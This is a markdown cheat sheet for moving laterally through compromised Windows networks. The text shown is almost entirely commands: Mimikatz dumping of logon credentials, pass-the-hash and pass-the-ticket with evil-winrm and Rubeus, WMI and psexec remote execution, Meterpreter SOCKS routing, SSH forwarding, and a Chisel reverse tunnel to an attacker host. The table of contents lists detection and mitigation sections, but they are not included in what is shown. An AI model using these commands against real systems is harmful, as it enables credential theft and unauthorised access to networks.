  
## 📚 Table of Contents

  

1. [Introduction](#introduction)
2. [Techniques for Lateral Movement](#techniques-for-lateral-movement)
    - [Using Credential Dumping](#using-credential-dumping)
    - [Pass-the-Hash](#pass-the-hash)
    - [Pass-the-Ticket](#pass-the-ticket)
    - [Over-Pass-the-Hash (Pass-the-Key)](#over-pass-the-hash-pass-the-key)
    - [WMI & WinRM Execution](#wmi--winrm-execution)
    - [PsExec & SMB](#psexec--smb)
3. [Pivoting Through Compromised Hosts](#pivoting-through-compromised-hosts)
    - [SOCKS Proxy via Meterpreter](#socks-proxy-via-meterpreter)
    - [SSH Pivoting / Port Forwarding](#ssh-pivoting--port-forwarding)
    - [Using Chisel / Ligolo / Proxychains](#using-chisel--ligolo--proxychains)
4. [Detecting Lateral Movement](#detecting-lateral-movement)
5. [Mitigations & Best Practices](#mitigations--best-practices)
6. [Conclusion](#conclusion)

  ---

## Techniques for Lateral Movement

### Using Credential Dumping

Dump credentials using Mimikatz or LSASS access:

```
mimikatz.exe
```

```
sekurlsa::logonpasswords
```

### Pass-the-Hash

```
evil-winrm -i 10.10.10.10 -u Administrator -H <NTLM_HASH>
```

  
### Pass-the-Ticket (PtT)

Extract and inject Kerberos tickets:

```
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH
```

```
Rubeus.exe ptt /ticket:TICKET.kirbi
```

### Over-Pass-the-Hash (Pass-the-Key)

```
mimikatz # kerberos::ptt ticket.kirbi
```
  
### WMI & WinRM Execution

```
Invoke-WmiMethod -ComputerName victim -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
```

```
evil-winrm -i 10.10.10.10 -u user -p password
```

### PsExec & SMB

```
psexec.py Administrator@10.10.10.10
```
  
---
  
## Pivoting Through Compromised Hosts
  
### SOCKS Proxy via Meterpreter

```
meterpreter > run autoroute -s 10.10.0.0/16
```

```
meterpreter > run socks_proxy
```
  
Configure proxychains or tools like:

```
proxychains xfreerdp ...
```

### SSH Pivoting / Port Forwarding

```
ssh -L 1080:10.10.10.10:3389 user@pivot_host
```

### Using Chisel / Ligolo / Proxychains

Start chisel server:

```
chisel server -p 8000 --reverse
```

Client:

```
chisel client <attacker-ip>:8000 R:1080:socks
```
